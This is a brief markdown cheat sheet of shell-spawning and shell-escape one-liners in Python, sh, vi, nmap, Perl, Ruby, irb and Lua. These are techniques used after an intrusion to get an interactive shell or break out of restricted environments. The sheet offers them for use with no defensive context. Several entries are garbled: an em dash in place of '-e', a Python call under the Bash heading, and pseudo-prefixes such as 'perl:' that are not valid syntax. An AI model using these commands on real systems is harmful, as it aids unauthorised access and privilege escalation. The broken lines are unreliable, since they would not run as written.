### Python
```python
python -c 'import pty; pty.spawn("/bin/sh")'
```

### Bash
```bash
echo os.system('/bin/bash')
```

From vi:
```sh
vi
:!bash
```
```sh
vi
:set shell=/bin/bash:shell
```

### SH
```sh
/bin/sh -i
```

From nmap:
```sh
nmap --interactive
!sh
```

### Perl
```perl
perl —e 'exec "/bin/sh";'
```
```perl
perl: exec "/bin/sh";
```

### Ruby
```ruby
ruby: exec "/bin/sh"
```

From irb:
```ruby
irb
exec "/bin/sh"
```

### Lua
```lua
lua: os.execute('/bin/sh')
```
